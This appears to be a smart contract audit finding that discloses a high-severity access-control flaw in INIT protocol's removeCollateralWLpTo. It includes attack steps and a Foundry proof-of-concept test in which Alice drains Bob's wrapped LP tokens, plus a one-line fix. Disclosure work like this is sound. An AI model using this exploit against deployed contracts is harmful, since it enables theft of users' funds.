[H-02] wLp tokens could be stolen
Submitted bysashik_eth, also found bysaid
PosManager#removeCollateralWLpTofunction allows users to remove collateral wrapped in a wLp token that was previously supplied to the protocol:
File:PosManager.sol249:functionremoveCollateralWLpTo(uint_posId,address_wLp,uint_tokenId,uint_amt,address_receiver)250:external251:onlyCore252:returns(uint)253:     {254:PosCollInfostorageposCollInfo=__posCollInfos[_posId];255:// NOTE: balanceOfLp should be 1:1 with amt256:uintnewWLpAmt=IBaseWrapLp(_wLp).balanceOfLp(_tokenId) -_amt;257:if(newWLpAmt==0) {258:_require(posCollInfo.ids[_wLp].remove(_tokenId),Errors.NOT_CONTAIN);259:posCollInfo.collCount-=1;260:if(posCollInfo.ids[_wLp].length() ==0) {261:posCollInfo.wLps.remove(_wLp);262:             }263:isCollateralized[_wLp][_tokenId] =false;264:         }265:_harvest(_posId,_wLp,_tokenId);266:IBaseWrapLp(_wLp).unwrap(_tokenId,_amt,_receiver);267:return_amt;268:     }
This function could be called only from the core contract using thedecollateralizeWLpandliquidateWLpfunctions. However, it fails to check if the specifiedtokenIdbelongs to the current position, this check would take place only if removing is full - meaning no lp tokens remain wrapped in the wLp (line 257).
This would allow anyone to drain any other positions with supplied wLp tokens. The attacker only needs to create its own position, supply dust amount in wLp to it, and calldecollateralizeWLpwith the desired ‘tokenId’, also withdrawn amount should be less than the full wLp balance to prevent check on line 257. An attacker would receive almost all lp tokens and accrued rewards from the victim’s wLp.
A similar attack for harvesting the victim’s rewards could be done through theliquidateWLpfunction.
Impact
Attacker could drain any wLp token and harvest all accrued rewards for this token.
Proof of Concept
The next test added to thetests/wrapper/TestWLp.solfile could show an exploit scenario:
functiontestExploitStealWlp()public{uintvictimAmt=100000000;// Bob open position with 'tokenId' 1uintbobPosId=_openPositionWithLp(BOB,victimAmt);// Alice open position with 'tokenId' 2 and dust amountuintalicePosId=_openPositionWithLp(ALICE,1);// Alice successfully de-collateralizes her own position using Bob's 'tokenId' and amounts less than Bob's position by 1 to prevent a revertvm.startPrank(ALICE,ALICE);initCore.decollateralizeWLp(alicePosId,address(mockWLpUniV2),1,victimAmt-1,ALICE);vm.stopPrank();emitlog_uint(positionManager.getCollWLpAmt(bobPosId,address(mockWLpUniV2),1));emitlog_uint(IERC20(lp).balanceOf(ALICE));}
Recommended Mitigation Steps
Consider adding a check that position holds the specified token into theremoveCollateralWLpTofunction:
_require(__posCollInfos[_posId].ids[_wlp].contains(_tokenId),Errors.NOT_CONTAIN);
fez-init (INIT) confirmed